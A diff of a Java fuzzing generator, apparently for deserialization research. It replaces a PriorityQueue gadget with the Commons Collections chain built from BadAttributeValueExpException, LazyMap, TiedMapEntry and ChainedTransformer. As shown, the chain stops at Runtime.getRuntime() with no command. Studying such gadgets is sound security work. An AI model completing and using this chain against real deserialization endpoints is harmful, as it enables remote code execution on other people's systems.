@@ -9,16 +9,27 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Modifier;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.PriorityQueue;
 import java.util.Queue;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+//import org.apache.commons.collections4.comparators.TransformingComparator;
+//import org.apache.commons.collections4.functors.InstantiateTransformer;
+
 
 import com.pholser.junit.quickcheck.internal.GeometricDistribution;
 import sun.misc.Unsafe;
 
+import javax.management.BadAttributeValueExpException;
 
-public class ObjectGenerator extends Generator<PriorityQueue> {
+
+public class ObjectGenerator extends Generator<BadAttributeValueExpException> {
 
     private static final GeometricDistribution geom = new GeometricDistribution();
     private static final double MEAN_ARRAY_DEPTH = 1.2;
@@ -35,15 +46,48 @@ public class ObjectGenerator extends Generator<PriorityQueue> {
     }
 
     public ObjectGenerator() {
-        super(PriorityQueue.class); // Register the type of objects that we can create
+        super(BadAttributeValueExpException.class); // Register the type of objects that we can create
     }
 
     @Override
-    public PriorityQueue generate(SourceOfRandomness random, GenerationStatus status) {
-        PriorityQueue queue = new PriorityQueue(2);
+    public BadAttributeValueExpException generate(SourceOfRandomness random, GenerationStatus status) {
+
+        //构造核心利用代码
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new org.apache.commons.collections.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new org.apache.commons.collections.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null})
+        };
+
+        //构造利用链
+        ChainedTransformer chain = new ChainedTransformer(transformers);
+
+        //触发连
+        HashMap hashMap = new HashMap();
+        LazyMap lazymap = (LazyMap) LazyMap.decorate(hashMap, chain);
+        //将lazyMap传给TiedMapEntry
+        TiedMapEntry entry = new TiedMapEntry(lazymap, "test");
+        //TiedMapEntry entry1 = new TiedMapEntry(null, "test");
+        //反射调用TiedMapEntry
+        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
+        //System.out.println(entry1);
+        Field val = null;
+        try {
+            val = bad.getClass().getDeclaredField("val");
+        } catch (NoSuchFieldException e) {
+            e.printStackTrace();
+        }
+        val.setAccessible(true);
+        try {
+            val.set(bad,entry);
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+
+/*        PriorityQueue queue = new PriorityQueue(2);
         queue.add(1);
         queue.add(1);
-        InvokerTransformer transformer = new InvokerTransformer(null,null,null);
+        InstantiateTransformer transformer = new InstantiateTransformer(null,null);
         TransformingComparator transformer_comparator = new TransformingComparator(transformer,null);
 
         //设置comparator属性
@@ -58,21 +102,21 @@ public class ObjectGenerator extends Generator<PriorityQueue> {
             field13.set(queue, transformer_comparator);
         } catch (IllegalAccessException e) {
             e.printStackTrace();
-        }
+        }*/
 
-        Field[] fields = queue.getClass().getDeclaredFields();//获取所有属性
+/*        Field[] fields = queue.getClass().getDeclaredFields();//获取所有属性
         for (Field field : fields) {
             if (Modifier.isFinal(field.getModifiers())) {
-/*                if (field.getName().equals("java.util.Comparator")) {
+*//*                if (field.getName().equals("java.util.Comparator")) {
                     field.setAccessible(true);
                     try {
                         field.set(queue, transformer_comparator);
                     } catch (IllegalAccessException e) {
                         e.printStackTrace();
                     }
-                }*/
+                }*//*
                 continue;
-            }
+            }*/
 /*            field.setAccessible(true);
             if (field.getType().isArray()) {
                 int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
@@ -91,8 +135,8 @@ public class ObjectGenerator extends Generator<PriorityQueue> {
                 }
             }*/
 
-            if (random.nextBoolean()) {
-                field.setAccessible(true);
+/*            if (random.nextBoolean()) {
+                field.setAccessible(true);*/
 /*                if (field.getType().equals(int.class)) {
                     try {
                         field.set(queue, random.nextInt(Integer.MIN_VALUE, Integer.MAX_VALUE));
@@ -149,7 +193,7 @@ public class ObjectGenerator extends Generator<PriorityQueue> {
                         e.printStackTrace();
                     }
                 }*/
-                if (field.getType().isArray() && Object.class.isAssignableFrom(field.getType())) {
+/*                if (field.getType().isArray() && Object.class.isAssignableFrom(field.getType())) {
                     int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
                     Object[] objects = new Object[depth];
                     for (int i =0; i<depth;i++) {
@@ -165,9 +209,9 @@ public class ObjectGenerator extends Generator<PriorityQueue> {
                         e.printStackTrace();
                     }
                 }
-            }
-        }
+            }*/
+        //}
 
-        return queue;
+        return bad;
     }
 }
